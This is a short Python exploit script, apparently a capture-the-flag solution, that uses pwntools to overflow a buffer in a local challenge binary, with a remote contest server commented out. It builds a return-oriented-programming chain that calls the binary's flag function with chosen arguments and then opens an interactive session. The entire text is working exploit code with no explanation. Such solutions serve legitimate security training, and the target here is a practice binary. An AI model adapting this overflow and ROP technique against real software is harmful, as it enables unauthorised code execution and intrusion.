from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

elf = ELF('./really_obnoxious_problem')
p = elf.process()
# p = remote('challs.actf.co', 31225)

offset = 72
pop_rdi = 0x4013f3
pop_rsi_r15 = pop_rdi - 2

payload = b'a'*offset
payload += p64(pop_rdi)
payload += p64(0x1337)
payload += p64(pop_rsi_r15)
payload += p64(0x402004)        # bobby string address
payload += p64(0)
payload += p64(elf.sym.flag)

p.recv()
p.sendline(b'a')
p.recv()
p.sendline(payload)

p.interactive()